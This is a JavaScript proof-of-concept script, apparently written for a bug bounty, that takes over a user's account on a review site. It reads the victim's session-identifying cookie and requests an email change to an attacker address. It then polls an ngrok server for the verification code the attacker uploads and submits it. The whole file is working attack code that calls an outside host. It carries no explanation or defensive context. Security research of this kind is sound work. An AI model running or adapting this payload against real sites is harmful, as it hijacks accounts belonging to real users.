function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
// Third Step -> Perform the final validation :)
function verifyCode(code) {
    const gartnerID = getCookie('gartnerID');
    if (!gartnerID) {
      console.error('gartnerID cookie not found');
      return;
    }

    fetch('/reviews/user-proxy/reviews/code-verify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        encUid: gartnerID,
        code: code,
        email: 'bctester1337@bugcrowdninja.com',
        mode: 'Y',
        enc: false
      })
    })
    .then(res => {
      if (!res.ok) throw new Error('Error');
      return res.json();
    })
    .then(data => {
      alert('ATO DONE! :)')
    })
    .catch(err => {
      console.error('Error in the POST:', err);
    });
}
// Second Step -> Wait for attacker upload the code to his server
function waitForCodeFile(interval = 5000) {
    function check() {
      fetch('https://4f58-83-10-227-89.ngrok-free.app/code.txt')
        .then(response => {
          if (!response.ok) throw new Error('Network error');
          return response.text();
        })
        .then(text => {
          const trimmedCode = text.trim();
          if (trimmedCode) {
            console.log('Verification Code Found:', text.trim());
            verifyCode(trimmedCode); // Perform ATO
          } else {
            setTimeout(check, interval);
          }
        })
        .catch(err => {
          console.error('Error obtaining code:', err);
          setTimeout(check, interval);
        });
    }

    check();
}

const gartnerID = getCookie('gartnerID');

// First Step -> Request change mail
if (gartnerID) {
fetch('/reviews/user-proxy/reviews/code-verify/send-email', {
    method: 'POST',
    headers: {
    'Content-Type': 'application/json'
    },
    body: JSON.stringify({
    usrId: gartnerID,
    email: 'sharedAnalyst@bugcrowdanalyst.com', // attacker mail
    referrer: '/reviews/account/profile'
    })
})
.then(response => {
    if (!response.ok) throw new Error('Network response was not ok');
    waitForCodeFile(5000);
    return response.json();
})
.then(data => {
    console.log('Request successful:', data);
})
.catch(error => {
    console.error('There was a problem with the fetch operation:', error);
});
} else {
console.error('gartnerID cookie not found.');
}
